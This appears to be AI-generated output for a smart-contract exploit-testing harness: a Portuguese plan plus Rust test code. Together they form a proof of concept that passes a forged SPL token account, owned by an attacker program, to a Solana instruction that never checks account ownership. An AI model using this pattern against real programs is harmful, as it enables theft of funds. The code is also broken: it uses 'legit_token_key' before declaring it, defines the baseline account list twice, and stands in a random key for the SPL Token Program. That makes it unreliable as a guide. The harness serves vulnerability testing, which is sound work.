{
  "plan": "O programa `log_message` recebe uma conta `token` como `AccountInfo` generica e desserializa com `SplTokenAccount::unpack` sem verificar o dono. O baseline usa uma conta SPL Token real (dono = SPL Token Program) cujo campo `owner` e a authority, provando que o cenario esta correto. O ataque substitui a conta `token` por uma conta forjada pertencente a um programa malicioso, com dados que desserializam como `SplTokenAccount` e campo `owner` igual a authority. O efeito medido e que a instrucao aceita a conta forjada (execucao bem-sucedida) e a conta resultante tem dono diferente do SPL Token Program, demonstrando a falha de validacao de propriedade.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker_program = Pubkey::new_unique();

// Conta SPL Token legitima: dono = SPL Token Program, dados com owner = authority
let spl_token_program = Pubkey::new_unique(); // apenas para o baseline, nao precisa ser o real
let mut legit_token_data = vec![0u8; 165];
legit_token_data[0..32].copy_from_slice(&authority.to_bytes()); // campo owner do SplTokenAccount
let legit_token = account(&spl_token_program, &legit_token_data, None);

let authority_account = wallet(1_000_000_000);

let contas_baseline = vec![
    (env.program_id, account(&env.program_id, &[], None)), // placeholder, nao usado
];

// Baseline: token legitimo com owner = authority
let ix_baseline = env.anchor_ix("log_message", &(), vec![
    AccountMeta::new_readonly(legit_token_key, false),
    AccountMeta::new_readonly(authority, true),
]);

// Precisamos das chaves das contas
let legit_token_key = Pubkey::new_unique();
let contas_baseline = vec![
    (legit_token_key, legit_token),
    (authority, authority_account),
];

let r_baseline = env.baseline("uso legitimo: token SPL real com owner = authority", &ix_baseline, &contas_baseline);

// Ataque: conta forjada pertencente a programa malicioso, dados que desserializam como SplTokenAccount com owner = authority
let forged_token_key = Pubkey::new_unique();
let mut forged_data = vec![0u8; 165];
forged_data[0..32].copy_from_slice(&authority.to_bytes()); // owner = authority
let forged_token = account(&attacker_program, &forged_data, None);

let ix_attack = env.anchor_ix("log_message", &(), vec![
    AccountMeta::new_readonly(forged_token_key, false),
    AccountMeta::new_readonly(authority, true),
]);

let contas_attack = vec![
    (forged_token_key, forged_token),
    (authority, wallet(1_000_000_000)),
];

let r_attack = env.attack("token forjado com dono malicioso e owner = authority", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let forged_after = after(&r_attack, &forged_token_key);
    env.effect("conta forjada aceita: dono diferente do SPL Token Program", forged_after.owner() != &spl_token_program);
    env.effect("conta forjada aceita: dono e o programa malicioso", forged_after.owner() == &attacker_program);
}"
}

